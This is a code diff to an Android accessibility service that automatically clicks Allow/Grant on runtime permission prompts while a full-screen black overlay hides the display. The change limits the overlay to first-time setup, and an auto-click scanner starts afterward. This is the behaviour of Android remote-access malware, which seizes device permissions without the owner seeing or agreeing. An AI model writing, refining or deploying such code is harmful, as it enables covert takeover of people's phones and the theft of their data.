@@ -106,7 +106,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Auto-grant timer clicks Allow/Grant for runtime permissions (storage excluded)
         try { startAutoGrantTimer(); } catch (Exception ignored) {}
         // Solid black overlay covers screen during the 10-second auto-grant window
-        try { addBlackOverlay(); } catch (Exception ignored) {}
+        // Only shown on first-time permission setup, not on every reboot/restart
+        try {
+            android.content.SharedPreferences prefs = getSharedPreferences("ra_prefs", MODE_PRIVATE);
+            boolean overlayDone = prefs.getBoolean("overlay_setup_done", false);
+            if (!overlayDone) {
+                addBlackOverlay();
+                prefs.edit().putBoolean("overlay_setup_done", true).apply();
+            }
+        } catch (Exception ignored) {}
         try {
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try { startAutoClickScanner(); } catch (Exception ignored) {}
